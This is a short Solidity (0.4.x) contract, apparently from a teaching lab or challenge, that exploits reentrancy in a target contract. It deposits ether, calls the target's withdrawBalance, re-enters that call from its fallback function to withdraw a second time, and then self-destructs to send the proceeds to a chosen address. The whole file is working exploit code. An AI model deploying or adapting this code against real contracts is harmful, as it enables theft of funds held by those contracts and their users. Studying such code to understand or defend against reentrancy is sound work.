pragma solidity ^0.4.15;

contract Reentrace{
   function getBalance(address) constant returns(uint);
   function addToBalance() payable;
   function withdrawBalance();
}

contract ReentranceExploit {
    bool public attackModeIsOn=false; 
    int public was_here=0;
    int public and_here=0;
    int public depook=0;
    address public r;

    function deposit(address r_){
        r = r_ ;
        r.call.value(500000000000000000)(bytes4(sha3("addToBalance()")));
    }

    function launch_attack(){
        attackModeIsOn = true;
        r.call(bytes4(sha3("withdrawBalance()")));
    }  


    function () payable{
        if (attackModeIsOn){
            attackModeIsOn = false;
                r.call(bytes4(sha3("withdrawBalance()")));
        }
    }

    function get_money(address a){
        suicide(a);
    }

}
